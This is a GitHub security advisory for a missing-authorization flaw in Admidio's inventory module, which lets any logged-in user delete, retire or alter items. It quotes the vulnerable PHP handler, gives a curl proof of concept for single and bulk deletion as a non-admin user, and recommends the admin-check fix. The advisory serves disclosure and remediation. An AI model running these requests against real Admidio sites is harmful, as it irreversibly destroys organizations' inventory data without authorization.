# [M] Admidio's Missing Authorization on Inventory Module Destructive Endpoints Allows Any Authenticated User to Delete Items

## Summary
Severity: Medium
Advisory: GHSA-xqv4-xm7h-52cv
CVE: CVE-2026-41658
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-xqv4-xm7h-52cv
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.9

## Details
## Summary

The Admidio inventory module enforces authorization for destructive operations (delete, retire, reinstate) only in the UI layer by conditionally rendering buttons. The backend POST handlers at `modules/inventory.php` for `item_delete`, `item_retire`, `item_reinstate`, `item_picture_upload`, `item_picture_save`, and `item_picture_delete` perform CSRF validation but never check whether the requesting user is an inventory administrator. Any authenticated user who can access the inventory module can permanently delete any inventory item and all its associated data.

## Details

The inventory module applies a module-level access control check at `modules/inventory.php:65-72` that determines whether a user can access the inventory module at all, based on the `inventory_module_enabled` setting. In the default configuration (value `2`), any logged-in user passes this check.

The `item_delete` handler at lines 381-397 only validates the CSRF token:

```php
// modules/inventory.php:381-397
case 'item_delete':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    if (count($getItemUUIDs) > 0) {
        foreach ($getItemUUIDs as $itemUuid) {
            $itemService = new ItemService($gDb, $itemUuid);
            $itemService->delete();
        }
        echo json_encode(array('status' => 'success', 'message' => $gL10n->get('SYS_INVENTORY_SELECTION_DELETED')));
    } else {
        $itemService = new ItemService($gDb, $getiniUUID);
        $itemService->delete();
        echo json_encode(array('status' => 'success', 'message' => $gL10n->get('SYS_INVENTORY_ITEM_DELETED')));
    }
    break;
```

There is no call to `$gCurrentUser->isAdministratorInventory()` before executing the deletion. The service layer (`ItemService::delete()` at `src/Inventory/Service/ItemService.php:86-92`) and the data layer (`ItemsData::deleteItem()` at `src/Inventory/ValueObjects/ItemsData.php:1078-1095`) also contain no authorization checks — they directly execute `DELETE FROM` SQL statements on the item data, borrow data, and item tables.

Meanwhile, the UI **does** check admin status before showing delete buttons:

```php
// modules/inventory.php:306-309 (UI only)
if ($gCurrentUser->isAdministratorInventory()) {
    $msg .= '<button id="adm_button_delete" ...>';
}
```

This creates a false sense of security — the button is hidden, but the endpoint is fully accessible. Item UUIDs needed for the attack are visible to all users who can view the inventory list.

The same missing-authorization pattern affects:
- `item_retire` (line 347) — soft-retires items without admin check
- `item_reinstate` (line 364) — reinstates retired items without admin check
- `item_picture_upload` (line 428) — uploads pictures without admin check
- `item_picture_save` (line 445) — saves pictures without admin check
- `item_picture_delete` (line 457) — deletes pictures without admin check

## PoC

Prerequisites: An Admidio instance with the inventory module enabled (default setting `inventory_module_enabled=2`), two user accounts — one admin who created inventory items, and one regular user with no inventory admin rights.

```bash
# Step 1: Log in as a regular (non-admin) user and get session cookie + CSRF token
# The CSRF token is embedded in any page the user can access
curl -c cookies.txt -b cookies.txt 'https://target/adm_program/modules/inventory.php?mode=item_list'

# Step 2: Extract a target item UUID from the inventory list page
# Item UUIDs are visible in the list view HTML to all users with module access

# Step 3: Permanently delete the item (as a non-admin user)
curl -X POST 'https://target/adm_program/modules/inventory.php?mode=item_delete&item_uuid=TARGET-ITEM-UUID' \
  -H 'Cookie: PHPSESSID=regular_user_session' \
  -d 'adm_csrf_token=EXTRACTED_CSRF_TOKEN'

# Expected response: {"status":"success","message":"Item deleted"}
# The item and all associated data (item fields, borrow records) are permanently deleted.

# Step 4: Bulk deletion is also possible
curl -X POST 'https://target/adm_program/modules/inventory.php?mode=item_delete&item_uuids[]=UUID1&item_uuids[]=UUID2&item_uuids[]=UUID3' \
  -H 'Cookie: PHPSESSID=regular_user_session' \
  -d 'adm_csrf_token=EXTRACTED_CSRF_TOKEN'
```

## Impact

- **Data destruction**: Any authenticated user can permanently delete any inventory item, including all associated field data and borrow records. There is no soft-delete or recycle bin — the SQL `DELETE FROM` statements are irreversible without database backups.
- **Bulk deletion**: The endpoint accepts multiple item UUIDs, allowing an attacker to delete all inventory items in a single request.
- **Additional unauthorized operations**: The same pattern allows non-admin users to retire/reinstate items and upload/modify/delete item pictures, undermining the entire inventory permission model.
- **Blast radius**: In organizations using Admidio's inventory module to track physical assets, a disgruntled member or compromised low-privilege account could wipe the entire inventory database.

## Recommended Fix

Add `isAdministratorInventory()` checks to all destructive inventory endpoints. The fix should be applied at the handler level in `modules/inventory.php` before any service calls:

```php
// modules/inventory.php — Add authorization check to item_delete
case 'item_delete':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    // ADD THIS: check if user has admin rights for inventory
    if (!$gCurrentUser->isAdministratorInventory()) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    if (count($getItemUUIDs) > 0) {
        // ... existing code
```

Apply the same pattern to `item_retire`, `item_reinstate`, `item_picture_upload`, `item_picture_save`, and `item_picture_delete`. Additionally, consider adding authorization checks in `ItemService` methods as defense-in-depth.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-xqv4-xm7h-52cv
- https://nvd.nist.gov/vuln/detail/CVE-2026-41658
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.9
